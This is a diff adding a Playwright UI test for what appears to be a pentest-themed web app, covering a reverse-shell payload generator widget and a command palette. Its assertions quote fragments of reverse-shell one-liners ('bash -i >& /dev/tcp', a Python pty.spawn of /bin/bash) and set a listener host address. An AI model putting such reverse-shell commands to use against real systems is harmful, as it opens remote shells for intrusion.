@@ -1208,5 +1208,52 @@ test("God-Tier 5.0: tactical pentest mission control, radar target acquisition, 
   await expect(copyBtn).toHaveText("COPIED");
 });
 
+test("God-Tier 6.0: neural omni-palette and tactical payload generator", async ({ page }) => {
+  await page.goto("/e2e.html?reset&fixture=basic&startup-preference=performance");
+
+  // 1. Verify Tactical Payload Generator on Welcome Dashboard
+  const payloadGen = page.locator(".tactical-payload-generator");
+  await expect(payloadGen).toBeVisible();
+  const codeBox = payloadGen.locator(".payload-code-box code");
+  await expect(codeBox).toContainText("bash -i >& /dev/tcp");
+
+  // Switch preset to Python PTY
+  const pythonPreset = payloadGen.getByRole("button", { name: "PYTHON3 PTY" });
+  await pythonPreset.click();
+  await expect(codeBox).toContainText('pty.spawn("/bin/bash")');
+
+  // Change LHOST & LPORT and verify live update
+  const hostInput = payloadGen.locator('.payload-input[placeholder="10.10.14.1"]');
+  await hostInput.fill("192.168.1.50");
+  await expect(codeBox).toContainText("192.168.1.50");
+
+  // Copy payload
+  const copyBtn = payloadGen.locator(".payload-copy-btn");
+  await copyBtn.click();
+  await expect(copyBtn).toHaveText(/PAYLOAD COPIED!/);
+
+  // 2. Test Neural Omni-Palette via Ctrl+Space
+  await page.keyboard.press("Control+Space");
+  const omniModal = page.locator(".omni-palette-modal");
+  await expect(omniModal).toBeVisible();
+
+  // Search in Omni-Palette
+  const omniInput = page.locator(".omni-search-input");
+  await omniInput.fill("Red Team");
+  const redTeamAction = page.locator(".omni-action-item").filter({ hasText: "Engage Red Team Mode" });
+  await expect(redTeamAction).toBeVisible();
+
+  // Execute action with Enter
+  await page.keyboard.press("Enter");
+  await expect(omniModal).toBeHidden();
+  await expect(page.locator("html")).toHaveAttribute("data-accent", "crimson");
+
+  // Open again and test Esc close
+  await page.keyboard.press("Control+Space");
+  await expect(omniModal).toBeVisible();
+  await page.keyboard.press("Escape");
+  await expect(omniModal).toBeHidden();
+});
+
 
 
